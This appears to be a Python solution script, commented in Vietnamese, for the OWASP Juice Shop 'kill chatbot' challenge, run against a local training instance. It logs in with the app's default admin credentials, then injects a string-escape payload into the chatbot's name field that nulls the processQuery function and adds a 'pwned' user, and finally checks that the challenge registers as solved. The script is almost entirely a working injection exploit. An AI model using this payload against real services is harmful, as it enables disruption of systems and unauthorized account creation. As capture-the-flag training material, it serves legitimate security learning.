import requests

def solve_kill_chatbot(server):
    """
    Vô hiệu hóa chatbot bằng cách tiêm mã vào trường 'name'.
    Hoàn toàn qua API, không cần trình duyệt.
    """
    # Cần session đã đăng nhập
    session = requests.Session()
    
    # Đăng nhập (dùng Admin hoặc user bất kỳ)
    login_payload = {"email": "admin@juice-sh.op", "password": "admin123"}
    login_res = session.post(f"{server}/rest/user/login", json=login_payload)
    token = login_res.json().get('authentication', {}).get('token')
    
    headers = {"Authorization": f"Bearer {token}"}
    
    # Payload tiêm mã - ghi đè hàm processQuery của chatbot
    malicious_name = 'hacker"); processQuery=null; users.addUser("pwned", "test'
    
    # Bước 1: Set tên độc hại
    setname_payload = {"action": "setname", "query": malicious_name}
    session.post(f"{server}/rest/chatbot/respond", json=setname_payload, headers=headers)
    
    # Bước 2: Gửi một vài query để trigger lỗi
    session.post(f"{server}/rest/chatbot/respond", json={"action": "query", "query": "hello"}, headers=headers)
    session.post(f"{server}/rest/chatbot/respond", json={"action": "query", "query": "test"}, headers=headers)
    
    # Bước 3: Chatbot giờ đã bị "giết" - không thể xử lý query nữa
    final_res = session.post(f"{server}/rest/chatbot/respond", json={"action": "query", "query": "bye"}, headers=headers)
    
    print(f"Final response: {final_res.status_code}")
    if final_res.ok:
        print(f"Body: {final_res.text[:200]}")

# Chạy
solve_kill_chatbot("http://localhost:3000")

# Check challenge
r = requests.get("http://localhost:3000/api/Challenges")
for c in r.json()['data']:
    if c['key'] == 'killChatbotChallenge':
        print(f"killChatbotChallenge: solved={c['solved']}")
